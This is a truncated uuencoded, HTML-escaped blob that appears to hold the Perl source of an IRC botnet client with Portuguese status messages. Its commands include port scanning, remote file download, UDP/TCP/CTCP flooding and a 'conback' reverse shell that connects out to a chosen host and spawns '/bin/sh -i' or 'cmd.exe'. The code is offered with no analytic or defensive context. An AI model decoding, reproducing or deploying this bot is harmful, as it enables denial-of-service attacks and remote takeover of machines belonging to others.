&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;9O&lt;F5A8V@@;7D@)&#x27;!O&lt;G1A_(&quot;A`&lt;&amp;]R=&amp;%S*2`@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;-C86YS;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5&quot;T^_;F5W*%!E97)!9&amp;1R(#T^(&quot;1H;W-T:7`L(%!E97)0;W)T(#T^(&quot;1P;W)T82P@4&#x27;)O=&amp;\\@/3X@)W1C&lt;&quot;&lt;L(%1I_;65O=70@/3X@-&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&#x27;-C86YS;V-K*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;!P=7-H(&quot;A`86)E&lt;G1A+&quot;`D&lt;&amp;]R=&amp;$I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;-C86YS;V-K+3YC;&amp;]S93L*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;A`86)E&lt;G1A*2![&quot;B`@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#I0;W)T87,@_86)E&lt;G1A&lt;SH@0&amp;%B97)T82(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD_&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;PB4%))5DU31R`D&lt;&#x27;)I;G1L(#I.96YH=6UA(&#x27;!O&lt;G1A(&amp;%B97)T82!F;VD@_96YC;VYT&lt;F%D82XB*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;@D_9G5N8V%R9R`]?B`O7F1O=VYL;V%D7&#x27;,K*&quot;XJ*5QS*R@N*BDO*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&amp;=E=&#x27;-T;W)E*&quot;(D_,2(L(&quot;(D,B(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT_;&quot;`Z1&amp;]W;FQO860@9&amp;4@)#(@*&quot;0Q*2!#;VYC;&#x27;4N9&amp;\\A(BD@:68@*&quot;1E&lt;W1A=&amp;ES=&amp;EC87,I.PH@(&quot;`@(&quot;`@_(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;@D9G5N8V%R9R`]?B`O7F9U;&amp;QP;W)T&lt;V-A;EQS*R@N*BE&lt;&lt;RLH_7&amp;0K*5QS*RA&lt;9&quot;LI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;AO&lt;W1N86UE/2(D,2([&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M_&gt;2`D&lt;&amp;]R=&amp;%I;FEC:6%L(#T@(B0R(CL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1P;W)T869I;F%L(#T@(B0S(CL*(&quot;`@_(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;A`86)E&lt;G1A&lt;RP@)7!O&lt;G1A7V)A;FYE&lt;BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!F;W)E86-H(&amp;UY_(&quot;1P;W)T82`H)&#x27;!O&lt;G1A:6YI8VEA;&quot;XN)&#x27;!O&lt;G1A9FEN86PI&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;![&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;UY(&quot;1S8V%N&lt;V]C:R`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0965R061D&lt;B`]/B`D:&amp;]S=&amp;YA;64L_(%!E97)0;W)T(#T^(&quot;1P;W)T82P@4&#x27;)O=&amp;\\@/3X@)W1C&lt;&quot;&lt;L(%1I;65O=70@/3X@-&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;EF(&quot;@D&lt;V-A;G-O8VLI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!P=7-H(&quot;A`86)E&lt;G1A&lt;RP@)&#x27;!O&lt;G1A*3L*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D&lt;V-A;G-O8VLM/F-L;W-E.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;@D97-T871I_&lt;W1I8V%S*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@_)&#x27;!R:6YT;&quot;`Z4&amp;]R=&amp;$@)&#x27;!O&lt;G1A(&amp;%B97)T82!E;2`D:&amp;]S=&amp;YA;64B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]_&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;A`86)E&lt;G1A&lt;RD@&gt;PH@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z4&amp;]R=&amp;%S_(&amp;%B97)T87,Z($!A8F5R=&amp;%S(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD_&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;PB4%))5DU31R`D&lt;&#x27;)I;G1L(#I.96YH=6UA(&#x27;!O&lt;G1A(&amp;%B97)T82!F;VD@_96YC;VYT&lt;F%D82XB*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@?0H*(&quot;`@(&quot;`@(&quot;`@(&quot;`@96QS:68@_*&quot;1F=6YC87)G(#U^(&quot;]&gt;=61P7&#x27;,K*&quot;XJ*5QS*RA&lt;9&quot;LI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;F5T_=7)N(&#x27;5N;&amp;5S&lt;R`D&lt;&amp;%C;W1E&lt;SL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S;V-K970H5&#x27;(P&gt;&quot;P@4$9?24Y%5&quot;P@4T]#2U]$_1U)!32P@,3&lt;I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1A;&#x27;9O/6EN971?871O;B@B)#$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;!M&gt;2`D&lt;&amp;]R=&amp;$@/2`B)#(B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1T96UP;R`](&quot;(D,R([&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@;7D@)&#x27;!A8V]T93L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D&lt;&amp;%C;W1E&lt;V4[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;9I_;2`](&#x27;1I;64@*R`D=&amp;5M&lt;&amp;\\[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;!A8V]T82`](#$[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_=VAI;&amp;4@*&quot;@D&lt;&amp;%C;W1A(#T](&quot;(Q(BD@)B8@*&quot;1P86-O=&amp;5S(#T](&quot;(Q(BDI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;1P86-O=&amp;$@/2`P(&amp;EF(&quot;@H=&amp;EM92`^/2`D9FEM*2`F)B`H)&#x27;1E;7!O(&quot;$](&quot;(P(BDI.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@)&#x27;!A8V]T93TD&lt;F%N9&quot;!X(&quot;1R86YD(&#x27;@@)&#x27;)A;F0[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D&lt;&amp;]R=&amp;$@/2!I_;G0H&lt;F%N9&quot;`V-3`P,&quot;D@*S$@:68@*&quot;1P;W)T82`]/2`B,&quot;(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&quot;A4&lt;C!X_+&quot;`P+&quot;`D&lt;&amp;%C;W1E+&quot;!S;V-K861D&lt;E]I;B@D&lt;&amp;]R=&amp;$L(&quot;1A;&#x27;9O*2D@86YD(&quot;1P86-O=&amp;5S92LK(&amp;EF(&quot;@D_&lt;&amp;%C;W1E&lt;R`]/2`B,2(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;5S=&amp;%T:7-T:6-A_&lt;RD*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))_5DU31R`D&lt;&#x27;)I;G1L(#I&lt;,#`R5&amp;5M&lt;&amp;\\@9&amp;4@4&amp;%C;W1E&lt;UPP,#(Z(&quot;1T96UP;R(N(G,B*3L*(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@&lt;V5N9&#x27;)A=R@D25)#7V-U&lt;E]S;V-K970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)4;W1A;&quot;!D92!0_86-O=&amp;5S7#`P,CH@)&#x27;!A8V]T97-E(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T_+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#I&lt;,#`R06QV;R!D;W,@4&amp;%C;W1E&lt;UPP,#(Z(&quot;0Q(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@?0H@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&quot;`@(&quot;`@(&quot;!E;&#x27;-I9B`H)&amp;9U;F-A&lt;F&lt;@/7X@+UYU9&#x27;!F86EX85QS_*R@N*BE&lt;&lt;RLH7&amp;0K*5QS*RA&lt;9&quot;LI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&#x27;!A8V]T97,[_&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V]C:V5T*%1R,&#x27;@L(%!&amp;7TE.150L(%-/0TM?1$=204TL(#$W*3L*(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;!M&gt;2`D9F%I&gt;&amp;%I&lt;#TB)#$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1P;W)T82`](&quot;(D,B([&quot;B`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@;7D@)&#x27;1E;7!O(#T@(B0S(CL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D&lt;&amp;%C;W1E.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&amp;UY(&quot;1P86-O=&amp;5S.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1F:6T@/2!T:6UE(&quot;L@)&#x27;1E;7!O.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;UY(&quot;1P86-O=&amp;$@/2`Q.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1A;&#x27;9O.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;=H:6QE_(&quot;@D&lt;&amp;%C;W1A(#T](&quot;(Q(BD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;!A8V]T82`](#`@:68@*&quot;AT:6UE(#X](&quot;1F_:6TI(&quot;8F(&quot;@D=&amp;5M&lt;&amp;\\@(3T@(C`B*2D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!F;W(@*&amp;UY(&quot;1F86EX82`](#$[(&quot;1F_86EX82`\\/2`R-34[(&quot;1F86EX82LK*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1A;&#x27;9O(#T@:6YE=%]A=&amp;]N*&quot;(D_9F%I&gt;&amp;%I&lt;&quot;XD9F%I&gt;&amp;$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;!A8V]T93TD&lt;F%N9&quot;!X(&quot;1R86YD(&#x27;@@)&#x27;)A_;F0[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1P;W)T82`](&amp;EN=&quot;AR86YD(#8U,#`P*2`K,2!I9B`H)&#x27;!O&lt;G1A(#T]_(&quot;(P(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F0H5&#x27;(P&gt;&quot;P@,&quot;P@)&#x27;!A8V]T92P@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O_&lt;G1A+&quot;`D86QV;RDI(&amp;%N9&quot;`D&lt;&amp;%C;W1E&lt;V4K*R!I9B`H)&#x27;!A8V]T97,@/3T@(C$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@:68@*&quot;1F86EX82`^/2`R-34I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D9F%I&gt;&amp;$@/2`Q.PH@(&quot;`@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&amp;EF(&quot;@D97-T871I&lt;W1I8V%S*0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&#x27;)A=R@D25)#_7V-U&lt;E]S;V-K970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)496UP;R!D92!086-O=&amp;5S7#`P,CH@)&#x27;1E;7!O_(BXB&lt;R(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT_;&quot;`Z7#`P,E1O=&amp;%L(&amp;1E(%!A8V]T97-&lt;,#`R.B`D&lt;&amp;%C;W1E&lt;V4B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&#x27;)A_=R@D25)#7V-U&lt;E]S;V-K970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)!;&#x27;9O(&amp;1O&lt;R!086-O=&amp;5S7#`P,CH@_)&amp;%L=F\\B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;@D9G5N_8V%R9R`]?B`O7F-O;F)A8VM&lt;&lt;RLH+BHI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;AO&lt;W0@/2`B_)#$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1P;W)T82`](&quot;(D,B([&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;!R;W1O(#T@_9V5T&lt;&#x27;)O=&amp;]B&gt;6YA;64H)W1C&lt;&quot;&lt;I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1I861D&lt;B`](&amp;EN971?871O;B@D:&amp;]S_=&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;!A9&amp;1R(#T@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O&lt;G1A+&quot;`D:6%D9&#x27;(I.PH@(&quot;`@_(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1S:&amp;5L;&quot;`](&quot;(O8FEN+W-H(&quot;UI(CL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)%Y/(&amp;5Q(&quot;)-_4U=I;C,R(BD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;-H96QL(#T@(F-M9&quot;YE&gt;&amp;4B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S;V-K970H4T]#2T54+&quot;!01E])3D54+&quot;!33T-+7U-44D5!32P@)&#x27;!R;W1O*2!O&lt;B!D_:64@(G-O8VME=#H@)&quot;$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;-O;FYE8W0H4T]#2T54+&quot;`D&lt;&amp;%D9&#x27;(I(&amp;]R(&amp;1I92`B_8V]N;F5C=#H@)&quot;$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;]P96XH4U1$24XL(&quot;(^)E-/0TM%5&quot;(I.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;]P96XH4U1$3U54+&quot;`B/B933T-+150B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!O&lt;&amp;5N*%-41$524BP@(CXF4T]#_2T54(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;WES=&amp;5M*&quot;(D&lt;VAE;&amp;PB*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C;&amp;]S92A35$1)_3BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@8VQO&lt;V4H4U1$3U54*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C;&amp;]S92A35$1%4E(I.PH*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;5S=&amp;%T:7-T:6-A&lt;RD*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#I&lt;,#`R0V]N96-T86YD;RUS92!E_;5PP,#(Z(&quot;1H;W-T.B1P;W)T82(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@?0H*(&quot;`@(&quot;`@(&quot;`@_(&quot;!E;&#x27;-I9B`H)&amp;9U;F-A&lt;F&lt;@/7X@+UYO;&amp;1P86-K7&#x27;,K*&quot;XJ*5QS*RA&lt;9&quot;LI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;`@_(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&#x27;!A8V]T97,[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`H)&amp;1T:6UE+&quot;`E&lt;&amp;%C;W1E_&lt;RD@/2!A=&#x27;1A8VME&lt;B@B)#$B+&quot;`B)#(B+&quot;`B)#,B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1D=&amp;EM92`](#$@:68@)&amp;1T_:6UE(#T](#`[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`E8GET97,[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D8GET97-[:6=M&lt;&#x27;T@/2`D_,B`J(&quot;1P86-O=&amp;5S&gt;VEG;7!].PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;)Y=&amp;5S&gt;VEC;7!](#T@)#(@*B`D&lt;&amp;%C;W1E&lt;WMI_8VUP?3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1B&gt;71E&lt;WMO?2`](&quot;0R(&quot;H@)&#x27;!A8V]T97-[;WT[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D_8GET97-[=61P?2`](&quot;0R(&quot;H@)&#x27;!A8V]T97-[=61P?3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1B&gt;71E&lt;WMT8W!](#T@)#(@_*B`D&lt;&amp;%C;W1E&lt;WMT8W!].PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@=6YL97-S(&quot;@D97-T871I&lt;W1I8V%S*0H@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z_7#`P,B`M(%-T871U&lt;R`M7#`P,B(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@_(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z7#`P,E1I;7!&lt;,#`R.B`D9&#x27;1I;64B+B)S96-U;F1E+B(I.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z7#`P,E1O=&amp;%L(&#x27;!A8VME_=%PP,#(Z(&quot;(N*&quot;1P86-O=&amp;5S&gt;W5D&lt;&#x27;T@*R`D&lt;&amp;%C;W1E&lt;WMI9VUP?2`K(&quot;1P86-O=&amp;5S&gt;VEC;7!](&quot;L@(&quot;1P_86-O=&amp;5S&gt;V]]*2D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))5DU31R`D_&lt;&#x27;)I;G1L(#I&lt;,#`R5&amp;]T86P@8GET97-&lt;,#`R.B`B+B@D8GET97-[:6-M&lt;&#x27;T@*R`D8GET97,@&gt;VEG;7!](&quot;L@_)&amp;)Y=&amp;5S&gt;W5D&lt;&#x27;T@*R`D8GET97-[;WTI*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&#x27;)A=R@D25)#7V-U&lt;E]S;V-K_970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)&amp;;&amp;]O9%PP,#(Z(&quot;(N:6YT*&quot;@H)&amp;)Y=&amp;5S&gt;VEC;7!]*R1B&gt;71E_&lt;WMI9VUP?2LD8GET97-[=61P?2`K(&quot;1B&gt;71E&lt;WMO?2DO,3`R-&quot;DO)&amp;1T:6UE*2XB(&amp;MB&lt;&#x27;,B*3L*(&quot;`@(&quot;`@_(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@97AI=#L*(&quot;`@(&quot;`@(&#x27;T*(&quot;!]&quot;GT*&quot;G-U8B!I&lt;F-A_&lt;V4@&gt;PH@(&amp;UY(&quot;@D:V5M+&quot;`D&lt;&#x27;)I;G1L+&quot;`D8V%S92D@/2!`7SL*&quot;B`@(&amp;EF(&quot;@D8V%S92`]?B`O7FIO:6X@_*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;!J*&quot;(D,2(I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7G!A&lt;G0@*&quot;XJ*2\\I(&#x27;L*_(&quot;`@(&quot;`@&lt;&quot;@B)#$B*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYR96IO:6Y&lt;&lt;RLH+BHI+RD@&gt;PH@(&quot;`@_(&quot;!M&gt;2`D8VAA;B`](&quot;0Q.PH@(&quot;`@(&quot;!I9B`H)&amp;-H86X@/7X@+UXH7&amp;0K*2`H+BHI+RD@&gt;PH@(&quot;`@(&quot;`@(&amp;9O_&lt;B`H;7D@)&amp;-A(#T@,3L@)&amp;-A(#P](&quot;0Q.R`D8V$K*R`I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&#x27;`H(B0R(BD[&quot;B`@(&quot;`@(&quot;`@_(&quot;!J*&quot;(D,B(I.PH@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&#x27;`H(B1C:&amp;%N(BD[&quot;B`@(&quot;`@_(&quot;`@(&quot;!J*&quot;(D8VAA;B(I.PH@(&quot;`@(&quot;!]&quot;B`@(&#x27;T*(&quot;`@96QS:68@*&quot;1C87-E(#U^(&quot;]&gt;;W`O*2![&quot;B`@(&quot;`@_(&amp;]P*&quot;(D&lt;&#x27;)I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E&lt;2`B;W`B.PH@(&quot;`@(&quot;!M&gt;2`D;V%R9R`](&#x27;-U8G-T_&lt;B@D8V%S92P@,RD[&quot;B`@(&quot;`@(&amp;]P*&quot;(D,2(L(&quot;(D,B(I(&amp;EF(&quot;@D;V%R9R`]?B`O*%Q3*RE&lt;&lt;RLH7%,K*2\\I_.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7F1E;W`O*2![&quot;B`@(&quot;`@(&amp;1E;W`H(B1P&lt;FEN=&amp;PB+&quot;`B)&amp;ME_;2(I(&amp;EF(&quot;1C87-E(&amp;5Q(&quot;)D96]P(CL*(&quot;`@(&quot;`@;7D@)&amp;]A&lt;F&lt;@/2!S=6)S=&#x27;(H)&amp;-A&lt;V4L(#4I.PH@(&quot;`@_(&quot;!D96]P*&quot;(D,2(L(&quot;(D,B(I(&amp;EF(&quot;@D;V%R9R`]?B`O*%Q3*RE&lt;&lt;RLH7%,K*2\\I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF_(&quot;@D8V%S92`]?B`O7G9O:6-E+RD@&gt;PH@(&quot;`@(&quot;!V;VEC92@B)&#x27;!R:6YT;&quot;(L(&quot;(D:V5M(BD@:68@)&amp;-A&lt;V4@_97$@(G9O:6-E(CL*(&quot;`@(&quot;`@)&amp;]A&lt;F&lt;@/2!S=6)S=&#x27;(H)&amp;-A&lt;V4L(#8I.PH@(&quot;`@(&quot;!V;VEC92@B)#$B+&quot;`B_)#(B*2!I9B`H)&amp;]A&lt;F&lt;@/7X@+RA&lt;4RLI7&#x27;,K*%Q3*RDO*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYD_979O:6-E+RD@&gt;PH@(&quot;`@(&quot;!D979O:6-E*&quot;(D&lt;&#x27;)I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E&lt;2`B9&amp;5V;VEC_92([&quot;B`@(&quot;`@(&quot;1O87)G(#T@&lt;W5B&lt;W1R*&quot;1C87-E+&quot;`X*3L*(&quot;`@(&quot;`@9&amp;5V;VEC92@B)#$B+&quot;`B)#(B*2!I_9B`H)&amp;]A&lt;F&lt;@/7X@+RA&lt;4RLI7&#x27;,K*%Q3*RDO*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYM&lt;V=&lt;&lt;RLH_7%,K*2`H+BHI+RD@&gt;PH@(&quot;`@(&quot;!M&lt;V&lt;H(B0Q(BP@(B0R(BD[&quot;B`@(&#x27;T*(&quot;`@96QS:68@*&quot;1C87-E(#U^(&quot;]&gt;_9FQO;V1&lt;&lt;RLH7&amp;0K*5QS*RA&lt;4RLI(&quot;@N*BDO*2![&quot;B`@(&quot;`@(&amp;9O&lt;B`H;7D@)&amp;-F(#T@,3L@)&amp;-F(#P](&quot;0Q_.R`D8V8K*RD@&gt;PH@(&quot;`@(&quot;`@(&amp;US9R@B)#(B+&quot;`B)#,B*3L*(&quot;`@(&quot;`@?0H@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S_92`]?B`O7F-T8W!F;&amp;]O9%QS*RA&lt;9&quot;LI7&